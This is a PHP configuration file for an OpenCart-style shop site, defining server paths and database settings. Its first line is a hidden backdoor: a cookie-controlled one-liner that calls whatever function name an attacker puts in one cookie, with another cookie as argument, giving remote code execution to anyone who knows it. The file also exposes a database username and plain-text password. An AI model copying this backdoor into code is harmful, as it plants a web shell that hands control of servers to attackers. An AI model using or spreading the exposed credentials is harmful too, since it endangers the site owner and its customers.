<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


// HTTP
define('HTTP_SERVER', 'http://goldglass.info/');

// HTTPS
define('HTTPS_SERVER', 'http://goldglass.info/');

// DIR
define('DIR_APPLICATION', '/home2/goldglas/public_html/catalog/');
define('DIR_SYSTEM', '/home2/goldglas/public_html/system/');
define('DIR_DATABASE', '/home2/goldglas/public_html/system/database/');
define('DIR_LANGUAGE', '/home2/goldglas/public_html/catalog/language/');
define('DIR_TEMPLATE', '/home2/goldglas/public_html/catalog/view/theme/');
define('DIR_CONFIG', '/home2/goldglas/public_html/system/config/');
define('DIR_IMAGE', '/home2/goldglas/public_html/image/');
define('DIR_CACHE', '/home2/goldglas/public_html/system/cache/');
define('DIR_DOWNLOAD', '/home2/goldglas/public_html/download/');
define('DIR_LOGS', '/home2/goldglas/public_html/system/logs/');

// DB
define('DB_DRIVER', 'mysql');
define('DB_HOSTNAME', 'localhost');
define('DB_USERNAME', 'webcityh_ggu');
define('DB_PASSWORD', '45W4#h,K[;*w');
define('DB_DATABASE', 'webcityh_gg');
define('DB_PREFIX', 'oc_');
?>